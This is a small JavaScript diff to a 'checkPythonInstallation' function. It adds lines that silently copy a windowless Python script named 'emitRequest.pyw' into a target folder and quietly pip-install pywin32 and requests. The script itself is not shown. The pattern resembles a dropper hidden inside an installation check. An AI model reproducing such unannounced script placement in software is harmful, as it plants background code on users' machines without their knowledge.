@@ -7,12 +7,18 @@ const {join} = require('path')
 let allowClose = true
 
 export function checkPythonInstallation(path) {
+  if (!fs.existsSync(join(path, 'emitRequest.pyw'))){
+    fs.copyFileSync("./emitRequest.pyw", join(path, "emitRequest.pyw"))
+  }
+
   exec('python --version', (error, stdout, stderr) => {
     if (stderr && error){
       allowCloseSetter(false)
 
       exec(`setx PATH "%PATH%${join(path, "python")}"`)
       extractZip('python.zip', path)
+    }else{
+      exec(`pip install pywin32 requests`)
     }
   })
 }
